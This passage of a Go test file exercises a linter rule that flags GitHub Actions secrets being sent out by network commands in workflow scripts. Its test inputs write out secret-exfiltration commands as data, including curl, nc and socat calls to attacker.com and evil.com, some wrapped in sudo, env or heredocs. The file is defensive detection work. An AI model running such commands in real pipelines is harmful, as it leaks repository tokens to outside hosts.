  socat - TCP:attacker.com:443`,
			wantErrors:  1,
			wantCommand: "socat",
		},
		{
			name:       "secret in git push argument is ignored because git is not a network sink",
			runScript:  `git push origin "${{ secrets.TOKEN }}"`,
			wantErrors: 0,
		},
		{
			name:        "sudo wrapped curl with secret is detected",
			runScript:   `sudo curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:       "sudo user argument named curl is not treated as network command",
			runScript:  `sudo -u curl echo -d '${{ secrets.TOKEN }}'`,
			wantErrors: 0,
		},
		{
			name:        "command wrapped curl with secret is detected",
			runScript:   `command curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:        "env wrapped curl with secret is detected",
			runScript:   `env FOO=bar curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
			wantErrors:  1,
			wantCommand: "curl",
		},
		{
			name:        "here-string secret into nc is detected",
			runScript:   `nc attacker.com 443 <<< '${{ secrets.TOKEN }}'`,
			wantErrors:  1,
			wantCommand: "nc",
		},
		{
			name:       "here-string to non-stdin fd is ignored",
			runScript:  `nc attacker.com 443 3<<< '${{ secrets.TOKEN }}'`,
			wantErrors: 0,
		},
		{
			name: "heredoc secret into nc is detected",
			runScript: `nc attacker.com 443 <<'EOF'
${{ secrets.TOKEN }}
EOF`,
			wantErrors:  1,
			wantCommand: "nc",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, tt.envVars)
			if len(errors) != tt.wantErrors {
				t.Fatalf("got %d errors, want %d. Errors: %v", len(errors), tt.wantErrors, errors)
			}

			if tt.wantCommand == "" {
				return
			}

			wantDescription := "network command '" + tt.wantCommand + "'"
			for _, err := range errors {
				if strings.Contains(err.Description, wantDescription) {
					return
				}
			}
			t.Fatalf("expected at least one error description to contain %q. Errors: %v", wantDescription, errors)
		})
	}
}

func TestSecretExfiltration_ExtractSecretRef(t *testing.T) {
	rule := NewSecretExfiltrationRule()

	tests := []struct {
		input    string
		expected string
	}{
		{"${{ secrets.MY_TOKEN }}", "secrets.MY_TOKEN"},
		{"${{ secrets.API_KEY }}", "secrets.API_KEY"},
		{"${{secrets.TOKEN}}", "secrets.TOKEN"},
		{"${{  secrets.KEY  }}", "secrets.KEY"},
		{"some text", ""},
		{"${{ github.token }}", ""},
	}

	for _, tt := range tests {
		got := rule.extractSecretRef(tt.input)
		if got != tt.expected {
			t.Errorf("extractSecretRef(%q) = %q, want %q", tt.input, got, tt.expected)
		}
	}
}

func TestSecretExfiltration_ASTArgSinkClassification(t *testing.T) {
	rule := NewSecretExfiltrationRule()
	curl, ok := networkCommandByName("curl")
	if !ok {
		t.Fatalf("curl command config not found")
	}

	call := shell.NetworkCommandCall{
		CommandName: "curl",
		Args: []shell.CommandArg{
			{Value: "-H", LiteralValue: "-H", IsFlag: true},
			{Value: "Content-Type: application/json", LiteralValue: "Content-Type: application/json"},
			{Value: "https://example.com/webhook", LiteralValue: "https://example.com/webhook"},
			{Value: "-d", LiteralValue: "-d", IsFlag: true},
			{Value: `{"token":"${{ secrets.TOKEN }}"}`, LiteralValue: `{"token":"${{ secrets.TOKEN }}"}`},
			{Value: "https://collector.example/upload", LiteralValue: "https://collector.example/upload"},
		},
	}

	if rule.isDataSinkArg(call, 2, curl) {
		t.Errorf("metadata header value should not make following URL positional arg a data sink")
	}
	if !rule.isDataSinkArg(call, 4, curl) {
		t.Errorf("-d payload value should be a data sink")
	}
	if rule.isDataSinkArg(call, 5, curl) {
		t.Errorf("URL positional arg should not be a data sink")
	}
}

// TestSecretExfiltration_EnvVarWithVarIndirection tests the case where a secret is
// mapped to an env var and the curl URL is stored in another variable (shadPS4 pattern).
func TestSecretExfiltration_EnvVarWithVarIndirection(t *testing.T) {
	makeStep := func(script string) *ast.Step {
		return &ast.Step{
			Exec: &ast.ExecRun{
				Run: &ast.String{
					Value: script,
					Pos:   &ast.Position{Line: 1, Col: 1},
				},
			},
			Env: &ast.Env{
				Vars: map[string]*ast.EnvVar{
					"GITHUB_TOKEN": {
						Value: &ast.String{Value: "${{ secrets.SHADPS4_TOKEN_REPO }}"},
					},
				},
			},
		}
	}

	tests := []struct {
		name       string
		runScript  string
		wantErrors int
		desc       string
	}{
		{
			name: "curl with env var token to api.github.com via variable (legitimate)",
			runScript: `api_url="https://api.github.com/repos/owner/repo"
result=$(curl -H "Authorization: token $GITHUB_TOKEN" "$api_url/releases/latest")`,
			wantErrors: 0,
			desc:       "Should NOT flag when URL variable resolves to api.github.com",
		},
		{
			name: "curl upload with env var token to uploads.github.com via variable (legitimate)",
			runScript: `upload_url="https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"
curl -X POST -H "Authorization: token $GITHUB_TOKEN" --data-binary @file "$upload_url"`,
			wantErrors: 0,
			desc:       "Should NOT flag when upload URL variable resolves to uploads.github.com",
		},
		{
			name: "curl with env var token to multi-line json POST to github api (legitimate)",
			runScript: `release_id=$(curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  -d '{
    "tag_name": "v1.0"
  }' "https://api.github.com/repos/owner/repo/releases" | jq -r '.id')`,
			wantErrors: 0,
			desc:       "Should NOT flag curl with multi-line JSON body to GitHub API",
		},
		{
			name:       "curl with env var token to attacker site (malicious)",
			runScript:  `curl -H "Authorization: token $GITHUB_TOKEN" "https://evil.com/exfil"`,
			wantErrors: 1,
			desc:       "Should flag curl sending env-var secret to non-legit destination",
		},
		{
			name: "later safe assignment does not allowlist earlier malicious call",
			runScript: `api_url="https://evil.com/exfil"
curl -H "Authorization: token $GITHUB_TOKEN" "$api_url"
api_url="https://api.github.com/repos/owner/repo"`,
			wantErrors: 1,
			desc:       "Should flag when URL variable was malicious at call time even if reassigned later",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()
			step := makeStep(tt.runScript)
			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)
			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d. Errors: %v", tt.desc, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestResolveVarInScript(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		script  string
		varName string
		want    string
	}{
		{
			name:    "double-quoted assignment",
			script:  `api_url="https://api.github.com/repos/owner/repo"`,
			varName: "api_url",
			want:    "https://api.github.com/repos/owner/repo",
		},
		{
			name:    "single-quoted assignment",
			script:  `api_url='https://api.github.com/repos/owner/repo'`,
			varName: "api_url",
			want:    "https://api.github.com/repos/owner/repo",
		},
		{
			name:    "unquoted assignment",
			script:  `api_url=https://api.github.com/repos/owner/repo`,
			varName: "api_url",
			want:    "https://api.github.com/repos/owner/repo",
		},
		{
			name:    "variable not found",
			script:  `other_var="https://example.com"`,
			varName: "api_url",
			want:    "",
		},
		{
			name: "last assignment wins (reassignment bypass prevention)",
			script: `api_url="https://api.github.com/safe"
api_url="https://evil.com/exfil"`,
			varName: "api_url",
			want:    "https://evil.com/exfil",
		},
		{
			name: "indented assignment",
			script: `  if true; then
    api_url="https://api.github.com/repos"
  fi`,
			varName: "api_url",
			want:    "https://api.github.com/repos",
		},
		{
			name: "assignment among other lines",
			script: `echo "starting"
TOKEN="secret-value"
echo "done"`,
			varName: "TOKEN",
			want:    "secret-value",
		},
		{
			name:    "empty script",
			script:  "",
			varName: "api_url",
			want:    "",
		},
		{
			name: "multiple different variables",
			script: `base_url="https://api.github.com"
upload_url="https://uploads.github.com"`,
			varName: "upload_url",
			want:    "https://uploads.github.com",
		},
		{
			name: "last assignment wins across quote styles",
			script: `url="https://api.github.com"
url='https://evil.com'`,
			varName: "url",
			want:    "https://evil.com",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			got := resolveVarInScript(tt.script, tt.varName)
			if got != tt.want {
				t.Errorf("resolveVarInScript(%q, %q) = %q, want %q", tt.script, tt.varName, got, tt.want)
			}
		})
	}
}
